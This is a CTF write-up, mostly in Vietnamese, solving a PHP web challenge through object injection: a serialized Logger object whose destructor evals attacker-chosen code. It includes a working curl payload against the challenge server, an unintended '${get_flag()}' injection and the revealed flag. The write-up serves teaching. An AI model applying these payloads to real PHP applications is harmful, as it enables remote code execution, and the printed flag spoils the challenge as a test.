## Fortnight challenge 2022: OOPs (Object oriented programming - supreme)

![warmup category](https://img.shields.io/badge/Category-web-brightgreen.svg)  
![score](https://img.shields.io/badge/Score_after_CTF-200-blue.svg)  
![author](https://img.shields.io/badge/Author-Hai%20Le%238679-blue.svg)  
![solves](https://img.shields.io/badge/Solves-25-lightgrey.svg)

### Description
Have you ever heard of OOP? Making the code works is one thing, making it maintainable is another thing lol. Just look at my perfectly-designed-OOP code and learn.

### Hints
- none

### Attached files
[index.php](https://github.com/compsec-hcmus/hcmus-wu/raw/main/write-up/Fortnight%20Challenge%202022/Web%20exploitation/OOPS/index.php)

### Summary
> Giới thiệu về **object injection in php**

### Detailed solution
Nhìn sơ qua thì trang web này đã setup khá cồng kềnh chỉ để làm 1 việc là in ra những gì mà mình đã nhập vào. Cách hoạt động sẽ diễn ra như sau:
1. Người dùng nhập nội dung vào `input`, hàm `handleSend` sẽ tạo ra 1 `serialized` object và base64 encode, sau đó reload lại trang web kèm với param `?msg=<encoded>`
2. Trang web nhận param `msg` và giải mã thành 1 object, sau đó lấy nội dung của `msg["content"]` và tạo 1 object `Logger`, khởi tạo attribute `$command = 'echo ("' . $message . '");'`
3. Class `Logger` được khai báo hàm `_destruct`, luôn được gọi khi object bị deallocate, bên trong hàm `_destruct` sẽ gọi `eval($this->command)`.
4. Nếu quá trình deserialize có vấn đề, 1 object `Logger` khác sẽ được gọi để in ra "Oops, something happened".
5. Khi đoạn code chạy hoàn tất, object `Logger` được khởi tạo sẽ bị deallocate, gọi hàm `_destruct` và in ra input mà bạn đã nhập.

Vấn đề ở quá trình này đó là thay vì nhận string `input`, trang web lại nhận về 1 serialized object *có vẻ như* là một object chứa `content` là input của người dùng. Cách làm này mở ra một phương pháp exploit gọi là `object injection`.

Bởi vì hàm `unserialize` có thể giữ nguyên cấu trúc của 1 object tương ứng với 1 class nào đó, chúng ta có thể truyền một serialized object của class `Logger`. Và vì attribute của class này là 1 câu lệnh để gọi trong hàm `eval`, chúng ta cũng hoàn toàn có thể kiểm soát những gì xảy ra trong hàm này, dẫn tới lỗi RCE. 

Vậy nên phương pháp để giải challenge này đó là khai báo class `Logger` giống như trên web, tạo 1 object tương ứng và lưu giá trị `$command` của nó thành `get_flag();`, `serialize` và `base64_encode` để gửi cho server. Tuy nhiên, vì code đã mặc định coi serialized object là `Array`, vậy nên, object cần gửi sẽ phải là 1 array có chứa object `Logger`.

```bash
> curl "http://103.245.249.107:35001/?msg=$(echo 'a:1:{i:0;O:6:"Logger":1:{s:7:"command";s:11:"get_flag();";}}' | base64 --wrap=0)"

<html>
  <head>
    <title>Object oriented programming - supreme</title>
    <link rel="stylesheet" href="static/style.css">
  </head>

  <body>
    <h1>Message echo-er</h1>
    <h3>Repeats the messages you want to send to yourself.</h3>
    <div class="container">
      <div id="form" class="content">
        <h2>Send your messages here:</h2>
        <input id="message" type="text" placeholder="your message">
        <button onclick="handleSend()">
          Send!
        </button>
      </div>
      <div class="message">
        <h2>Your message</h2>
              </div>
    </div>

    <script>
      function handleSend() {
        const elem = document.getElementById("message");
        const message = elem.value;
        serialized_obj = `a:1:{s:7:"content";s:${message.length}:"${message}";}`;

        console.log(serialized_obj, btoa(serialized_obj));

        document.location = document.location.origin + "?msg=" + btoa(serialized_obj);
      }
    </script>
  </body>
</html>You sent the message: f0rtn1ght{a5_l0ng_As_1t_w0rk5}
```

### Note
Vì người ra đề này vẫn còn non tay nên đã không restrict kĩ hơn, cho phép mọi người tùy ý RCE challenge này, vậy nên mình rất cảm ơn các bạn tham gia đã không làm sập trang web 🙏

Ngoài ra, việc ghép `'echo ("' . $message . '");'` như thế này cũng cho phép RCE mà không cần object injection vì bạn vẫn có thể gọi bất cứ hàm nào bằng cách sử dụng tính năng [string parsing](https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing) của php. Nên uninteded sol của bài là chỉ cần nhập `${get_flag()}` là bạn vẫn có thể lấy được flag.

Mong các bạn thứ lỗi

### Flag
```
f0rtn1ght{a5_l0ng_As_1t_w0rk5}
```
